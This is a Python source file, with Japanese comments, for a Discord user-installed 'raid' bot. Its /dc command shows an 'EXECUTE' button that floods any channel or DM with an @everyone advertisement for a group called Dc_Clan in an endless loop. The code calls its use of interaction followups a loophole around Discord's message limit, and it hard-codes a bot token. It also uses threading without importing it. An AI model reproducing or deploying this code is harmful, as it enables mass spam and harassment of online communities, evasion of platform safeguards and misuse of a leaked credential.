import discord
from discord import app_commands
import asyncio
from flask import Flask
app = Flask(__name__)


@app.route("/")
def home():
    return "Bot is alive!"  # Renderなどの生存監視用


# Flaskをバックグラウンドで起動するための関数
def run_flask():
    # host="0.0.0.0" にすることで外部（Renderなど）からのアクセスを許可します
    # port=8080 は環境に合わせて変更してください
    app.run(host="0.0.0.0", port=8080)


SPAM_TEXT = """
# @everyone
# Raided by Dc_Clan!!!
# Join now -> [Dc_Clan](https://ptb.discord.com/invite/dQHMusQbcq)
```
⠀⠀⠀⠀⣀⠤⠔⠒⠒⠒⠒⠒⠒⠒⠦⢄⣀⠀⠀⠀⠀
⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⠀⠀
⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣣⠀
⢸⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⠈⡇
⢸⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⡇
⠘⡆⢸⠀⢀⣀⣤⣄⡀⠀⠀⠀⢀⣤⣤⣄⡀⠀⡇⡸⠀
⠀⠘⣾⠀⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⡗⠁⠀
⠀⠀⣿⠀⠙⢿⣿⠿⠃⢠⢠⡀⠙⠿⣿⠿⠃⠀⡇⠀⠀
⠀⠀⠘⣄⡀⠀⠀⠀⢠⣿⢸⣿⠀⠀⠀⠀⠀⣠⠇⠀⠀
⠀⠀⠀⠀⡏⢷⡄⠀⠘⠟⠈⠿⠁⠀⢠⡞⡹⠁⠀⠀⠀
⠀⠀⠀⠀⢹⠸⠘⢢⢠⠤⠤⡤⡄⢰⢡⠁⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠣⣹⢸⠒⠒⡗⡇⣩⠌⢀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢧⡀⠀⠉⠉⠉⠉⠁⠀⣀⠜⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠓⠢⠤⠤⠤⠔⠊⠁⠀⠀⠀⠀⠀⠀
```
-# https://ptb.discord.com/invite/dQHMusQbcq
-# https://dcshorts.dpdns.org/Dc_Clan
-# https://imgur.com/a/QuS0xJy"""

MENTIONS = discord.AllowedMentions(everyone=True)

class SpamView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="EXECUTE", style=discord.ButtonStyle.danger)
    async def execute(self, interaction: discord.Interaction, button: discord.ui.Button):
        # 1発目は interaction response — これが「1インタラクション1メッセージ」制限の抜け穴
        await interaction.response.send_message(SPAM_TEXT, allowed_mentions=MENTIONS)

        # 以降は followup で無制限送信
        while True:
            try:
                await interaction.followup.send(SPAM_TEXT, allowed_mentions=MENTIONS)
            except discord.HTTPException:
                pass
            await asyncio.sleep(0.7)
client = discord.Client(intents=discord.Intents.default())
tree = app_commands.CommandTree(client)


@tree.command(name="dc", description="spam")
@app_commands.allowed_installs(guilds=False, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def dc(interaction: discord.Interaction):
    await interaction.response.send_message("# SPAM", view=SpamView(), ephemeral=True)

@client.event
async def on_ready():
    await tree.sync()
    print(f"logged in as {client.user}")

if __name__ == "__main__":
    # 2. 先にFlaskを別スレッド（バックグラウンド）で起動
    flask_thread = threading.Thread(target=run_flask)
    # daemon=Trueにすると、メインのBotが終了したときにFlaskも一緒に終了します
    flask_thread.daemon = True
    flask_thread.start()
client.run("MTU1NzA1NDQxODAxNTQ5MDE1Mg.Gd0PXC.3TAz13m39f5-yG8my17tL0L4Xa8wHT7_haPJpg")
